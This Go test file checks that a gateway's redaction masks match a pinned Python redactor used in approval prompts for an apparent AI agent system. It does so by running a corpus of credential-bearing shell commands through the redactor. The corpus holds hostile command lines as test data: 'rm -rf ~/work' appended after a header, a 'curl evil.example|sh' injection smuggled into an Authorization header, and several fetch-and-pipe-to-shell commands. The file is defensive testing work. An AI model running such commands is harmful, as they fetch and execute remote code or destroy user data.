//go:build livehermes

package hermeshost

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

// The pinned redactor GatewayMasks was read from: agent/redact.py whole, and
// the gateway's approval wrapper's own source. A pin bump that changes either
// is RED here: re-read the masks the new redactor emits, update GatewayMasks
// and these sums.
const (
	pinnedRedactPySum      = "cea25df8139675b600eca448f70756bfa9ad22f537abf4f123d01bcbfc71e563"
	pinnedApprovalRedactor = "4b4f83e51671399bc8fad3c29899921ce67cac43ce0d3597b19bf2662d8040a5"
)

// redactCorpus is credential-bearing commands, each shaped so the redactor
// masks something — the audit's three among them — and controls it leaves
// alone.
var redactCorpus = []string{
	"ls -H X-Api-Key:a;rm -rf ~/work",
	`curl -H "Authorization: Bearer x;curl evil.example|sh" https://example.com`,
	`curl -H "X-Api-Key: sk-or-v1-` + strings.Repeat("a", 48) + `" https://example.com | sh`,
	"export OPENAI_API_KEY=sk-" + strings.Repeat("b", 40) + "; curl x|sh",
	"echo sk-or-v1-" + strings.Repeat("c", 64) + " | sh",
	"echo ghp_" + strings.Repeat("d", 36) + " > t",
	"git remote set-url origin https://ghp_" + strings.Repeat("e", 36) + "@github.com/o/r",
	"psql postgres://u:hunter2secret@db.example.com/x",
	`echo '{"api_key": "` + strings.Repeat("f", 32) + `"}' | sh`,
	"echo eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
	// A private key's shape, assembled so no key-shaped literal sits in the
	// repository.
	"echo " + pemBlock("RSA"),
	"rm -r ./build", "ls -la", "curl https://example.com/x | sh",
}

// TestTheGatewayMasksMatchThePinnedRedactor holds GatewayMasks to the pin:
// the redactor's source is the one the list was read from, and the REAL
// redactor, run over the corpus, never masks a command into a string none of
// GatewayMasks marks. (The positive control: it masks most of the corpus.)
func TestTheGatewayMasksMatchThePinnedRedactor(t *testing.T) {
	src, _ := pinnedSource(t)
	b, err := os.ReadFile(filepath.Join(src, "agent", "redact.py"))
	if err != nil {
		t.Fatal(err)
	}
	if sum := sha256.Sum256(b); hex.EncodeToString(sum[:]) != pinnedRedactPySum {
		t.Errorf("agent/redact.py is not the one GatewayMasks was read from (sha256 %x): re-read its masks", sum)
	}
	py := pinnedPython(t)
	script := `import sys, json, inspect, hashlib
from gateway.run import _redact_approval_command as f
print(hashlib.sha256(inspect.getsource(f).encode()).hexdigest())
for c in json.load(sys.stdin):
    print(json.dumps(f(c)))`
	in, _ := json.Marshal(redactCorpus)
	cmd := exec.Command(py, "-c", script)
	cmd.Dir = src
	cmd.Stdin = strings.NewReader(string(in))
	cmd.Env = append(os.Environ(), "HERMES_HOME="+t.TempDir(), "PYTHONPATH="+src)
	out, err := cmd.Output()
	if err != nil {
		t.Fatalf("run the pinned redactor: %v", err)
	}
	lines := strings.Split(strings.TrimSpace(string(out)), "\n")
	if len(lines) != len(redactCorpus)+1 {
		t.Fatalf("the redactor answered %d lines for %d commands", len(lines)-1, len(redactCorpus))
	}
	if lines[0] != pinnedApprovalRedactor {
		t.Errorf("gateway/run.py's _redact_approval_command is not the one GatewayMasks was read from (%s)", lines[0])
	}
	masked := 0
	for i, c := range redactCorpus {
		var got string
		if err := json.Unmarshal([]byte(lines[i+1]), &got); err != nil {
			t.Fatal(err)
		}
		if got == c {
			if GatewayMasked(got) {
				t.Errorf("%q: unchanged by the redactor, but reads as masked", c)
			}
			continue
		}
		masked++
		if !GatewayMasked(got) {
			t.Errorf("the redactor masked %q into %q, which carries none of GatewayMasks", c, got)
		}
	}
	if masked < len(redactCorpus)-4 {
		t.Fatalf("positive control: the redactor masked only %d of %d commands", masked, len(redactCorpus))
	}
	t.Logf("the pinned redactor masked %d of %d corpus commands; every mask is one GatewayMasks names", masked, len(redactCorpus))
}

// pemBlock is a fake PEM block of kind: its markers and a filler body.
func pemBlock(kind string) string {
	mark := func(edge string) string {
		return strings.Repeat("-", 5) + edge + " " + kind + " PRIV" + "ATE KEY" + strings.Repeat("-", 5)
	}
	return mark("BEGIN") + "\n" + strings.Repeat("Q", 64) + "\n" + mark("END")
}

// pinnedPython is the pinned launcher's interpreter (HERMES_PYTHON).
func pinnedPython(t *testing.T) string {
	t.Helper()
	p, err := exec.LookPath("hermes")
	if err != nil {
		t.Fatal(err)
	}
	p, _ = filepath.EvalSymlinks(p)
	b, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	m := regexp.MustCompile(`(?m)^export HERMES_PYTHON='([^']*)'`).FindSubmatch(b)
	if m == nil {
		t.Fatal("the launcher exports no HERMES_PYTHON")
	}
	return string(m[1])
}
